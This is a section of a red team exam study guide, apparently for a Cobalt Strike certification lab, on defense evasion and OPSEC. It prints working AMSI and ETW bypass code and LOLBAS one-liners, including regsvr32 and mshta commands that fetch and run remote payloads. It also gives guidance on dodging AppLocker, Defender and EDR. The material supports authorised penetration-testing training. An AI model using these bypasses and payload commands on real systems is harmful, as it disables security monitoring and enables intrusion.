## 15. Defense evasion and OPSEC deep dive

Half the exam is this section. The goal is not "bypass everything" — it is **not to generate the detections the exam is scoring**.

### 15.1 The scoring model, restated

Public candidate reports consistently describe these OPSEC categories:

| Category | What triggers it | Best mitigation |
|---|---|---|
| Blocked code execution | AppLocker/WDAC blocks a binary or script | Test payloads; use allowed paths/LOLBAS |
| Unusual process network connections | A process that should not egress makes an outbound connection | `spawnto`, redirectors, believable profile |
| Default Cobalt Strike indicators | Default profile, port, pipe, `rundll32.exe` spawn | Customise before first beacon |
| Suspicious lateral movement | Service creation, PsExec, noisy WinRM | WinRM/SMB beacons, minimal hops |
| LSASS handle access | `mimikatz`, `hashdump`, dump tools | Avoid or minimise; use other sources |
| Disabling security controls | Turning off Defender, clearing logs | Never |
| Restricted hosts | Any detection on the RoE list | Read the list; use the quietest path or skip |

### 15.2 AMSI

AMSI scans PowerShell, .NET, VBScript, and some other content before execution. `powerpick` and `execute-assembly` host the CLR in the beacon process, so AMSI can still see the content.

```text
# Cobalt Strike kit command (covers powerpick, execute-assembly, psinject — NOT the powershell command) ⚠
amsi_disable
```

```powershell
# Classic amsiInitFailed bypass (heavily signatured; vary it)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

```powershell
# AMSI context patch (also signatured; vary strings/obfuscation)
$a = [Ref].Assembly.GetTypes() | ? { $_.Name -like "*iUtils" }
$b = $a.GetFields('NonPublic,Static') | ? { $_.Name -like "*Context" }
$c = $b.GetValue($null)
[System.Runtime.InteropServices.Marshal]::WriteInt32($c, 0x41414141)
```

**OPSEC:** every public AMSI bypass is signatured. Prefer:
- `execute-assembly` with a tool that is not flagged, rather than a bypass.
- `blockdlls start` to keep EDR userland DLLs out of the sacrificial process.
- A custom/obfuscated bypass only if you must run a flagged script.
- `amsi_disable` where the kit provides it; remember it does **not** cover `powershell`.

### 15.3 ETW

ETW feeds many EDR detections (process, image load, .NET). Userland patching of `EtwEventWrite` can blind some consumers, but kernel callbacks and ETW Threat-Intelligence providers may still fire.

```powershell
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class ETW {
  [DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr h, string p);
  [DllImport("kernel32.dll")] public static extern IntPtr LoadLibrary(string n);
  [DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint np, out uint op);
}
"@
$ntdll = [ETW]::LoadLibrary("ntdll.dll")
$addr  = [ETW]::GetProcAddress($ntdll, "EtwEventWrite")
$old   = 0
[ETW]::VirtualProtect($addr, [UIntPtr]1, 0x40, [ref]$old) | Out-Null
[System.Runtime.InteropServices.Marshal]::WriteByte($addr, 0xC3)   # ret
```

**OPSEC:** patching ETW is itself a detection on a monitored host. Do not do it on Tier 0. Prefer not to generate the event in the first place.

### 15.4 AppLocker and WDAC

```text
powershell Get-AppLockerPolicy -Effective -Xml
powershell Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
powershell Get-ChildItem "HKLM:Software\Policies\Microsoft\Windows\SrpV2"
powershell $ExecutionContext.SessionState.LanguageMode
```

**Default AppLocker behaviour:** rules usually allow `C:\Windows` and `C:\Program Files`. `C:\Windows\Tasks` is commonly writable by users and therefore a useful path. DLL enforcement is often not enabled.

```text
# Check writable locations
powershell Get-Acl C:\Windows\Tasks | fl
powershell Get-Acl C:\Windows\Temp  | fl
icacls "C:\Windows\Tasks"
```

**LOLBAS execution (choose one that is allowed and believable):**

```text
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe C:\Windows\Tasks\payload.csproj
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Windows\Tasks\payload.dll
C:\Windows\System32\regsvr32.exe /s /u /i:http://<host>/payload.sct scrobj.dll
C:\Windows\System32\rundll32.exe C:\Windows\Tasks\payload.dll,EntryPoint
C:\Windows\System32\mshta.exe http://<host>/payload.hta
C:\Windows\System32\forfiles.exe /p C:\Windows\System32 /m notepad.exe /c "C:\Windows\Tasks\payload.exe"
C:\Windows\System32\pcalua.exe -a C:\Windows\Tasks\payload.exe
"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --headless --disable-gpu-sandbox --gpu-launcher="C:\Windows\Tasks\payload.exe &&"
```

**Constrained Language Mode (CLM):**

```text
powershell $ExecutionContext.SessionState.LanguageMode
# ConstrainedLanguage means many PowerShell bypasses are blocked
```

CLM bypasses are version-dependent and often blocked. Prefer `execute-assembly` (.NET may run) or a non-PowerShell payload. `PSByPassCLM` / `InstallUtil`-based CLM removal ⚠ works only on some builds.

**OPSEC:** a **blocked** execution is a scored detection even if nothing runs. Check the policy before you try. Use a path the policy allows, and prefer a signed LOLBAS binary over a custom unsigned EXE.

### 15.5 Microsoft Defender

```text
powershell Get-MpComputerStatus
powershell Get-MpPreference | select DisableRealtimeMonitoring,DisableIOAVProtection,ExclusionPath,ExclusionProcess
powershell (Get-MpPreference).AttackSurfaceReductionRules_Ids
powershell (Get-MpPreference).AttackSurfaceReductionRules_Actions
```

**Key ASR rules to check**

| Rule | GUID | Effect |
|---|---|---|
| Block credential stealing from LSASS | `9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2` | Blocks Mimikatz-style access |
| Block process creations from PSExec/WMI | `d1e49aac-8f56-4280-b9ba-993a6d77406c` | Blocks psexec/WMI lateral |
| Block executable content from email/webmail | `be9ba2d9-53ea-4cdc-84e5-9b1eeee46550` | Blocks download-and-run |
| Block Office child processes | `d4f940ab-401b-4efc-aadc-ad5f3c506588` | Blocks macro execution |
| Block persistence via WMI subscription | `e6db77e5-3df2-4cf1-b95a-636979351e5b` | Blocks WMI persistence |
| Block untrusted executables from USB | `b2b3f03d-6a65-4f7b-a9c7-1c7ef74a9ba4` | — |
| Advanced ransomware protection | `c1db55ab-c21a-4637-bb3f-a12568109d35` | — |

**Do not disable Defender.** `Set-MpPreference -DisableRealtimeMonitoring $true` is likely blocked by tamper protection, and when it works it logs 5001 and is almost certainly a scored detection.

Quieter options:
- **Artifact Kit + Resource Kit** rebuilt against your profile.
- **Malleable profile** with `userwx "false"`, `cleanup "true"`, `obfuscate "true"`.
- **Sleep Mask Kit** to hide beacon memory during sleep.
- `blockdlls start` and a non-default `spawnto`.
- Stageless, obfuscated payloads; avoid known-bad hashes.
- Avoid writing tools to disk; use `execute-assembly`.

### 15.6 Process, injection, and lineage OPSEC

| Action | Detection surface | Mitigation |
|---|---|---|
| `execute-assembly` | New process, .NET image load | Use a believable `spawnto`; `blockdlls` |
| `powerpick` | CLR in beacon process | Avoid flagged scripts; AMSI |
| `inject` / `shinject` | Sysmon 8/10, image load | Inject into a suitable process, not critical ones |
| `spawn` | New process, parent lineage | Parent should make sense for the child |
| `mimikatz` | LSASS access + sacrificial process | Avoid; if used, once, then delete |
| `hashdump` | LSASS access | Prefer DPAPI/tickets |
| `getsystem` | Named pipe + token | Expected, but still telemetry |

**Rules of thumb:**
- Never inject into `lsass.exe`, `winlogon.exe`, `csrss.exe`, `services.exe`, `MsMpEng.exe`, or `svchost.exe` hosting critical services.
- A `rundll32.exe` parent that spawns `cmd.exe` or opens SMB is a classic pattern. Change `spawnto`.
- A beacon process making HTTPS to a random IP with no proxy history is a classic pattern. Use redirectors and a believable profile.
- Keep parent/child stories consistent: a browser spawning `rundll32` is odd; an installer spawning `msiexec` is normal.

### 15.7 Egress OPSEC

- Use a **redirector** or CDN in front of the team server; never expose it.
- Prefer **HTTPS/443** or **HTTP/80** with a believable Host header.
- Match the **user-agent**, URI paths, and headers to the Host header's story.
- Avoid DNS beacons unless egress demands it; DNS is slow and noisy.
- Keep the egress beacon **slow** (60s+) with jitter; spawn short-lived sessions for work.
- Do not let every host call home. Use SMB/TCP peer-to-peer.
- If a proxy is present, know whether the beacon is proxy-aware and whether direct egress is allowed.

### 15.8 Logging and cleanup

- **Do not clear event logs.** 1102 is a scored detection.
- **Do not disable logging or auditing.**
- Prefer in-memory execution; if you write a file, delete it.
- Prefer `execute-assembly`/`powerpick` over `shell`; command-line logging (4688) is enabled in most modern environments.
- PowerShell script-block logging (4104) sees content; `powerpick` does not spawn `powershell.exe` but the CLR still runs.
- Delete: payloads, dumps, tools, hives, exported certificates, staged files.
- Remove: services, scheduled tasks, firewall rules, registry keys, WMI subscriptions, ACL entries, RBCD attributes, shadow credentials, tickets/tokens, port forwards, proxies.

### 15.9 The pre-submit OPSEC checklist

Use Appendix G. The short version:

- [ ] Custom profile, non-default port, URI, user-agent, pipe, `spawnto`
- [ ] No `rundll32.exe` beacon parents left running
- [ ] No LSASS access on restricted hosts
- [ ] No services/tasks/files/firewall rules left behind
- [ ] No ACL/delegation/shadow-credential changes left in AD
- [ ] No Defender/logging changes
- [ ] No unexpected egress from odd processes
- [ ] All proxies, port forwards, and extra beacons closed

### 15.10 Troubleshooting

| Symptom | Cause | Fix |
|---|---|---|
| Execution blocked, no error | AppLocker/WDAC | Check policy; use an allowed path/LOLBAS |
| AMSI blocks a script | Signature | `execute-assembly` alternative; vary bypass |
| Payload quarantined on write | Defender static | Rebuild artifact; avoid disk |
| Beacon killed after injection | EDR behavioural | Change target process/`spawnto`; `blockdlls` |
| PowerShell in CLM | Constrained mode | Use .NET assembly or non-PS payload |
| `Set-MpPreference` fails | Tamper protection | Do not fight it; evade instead |

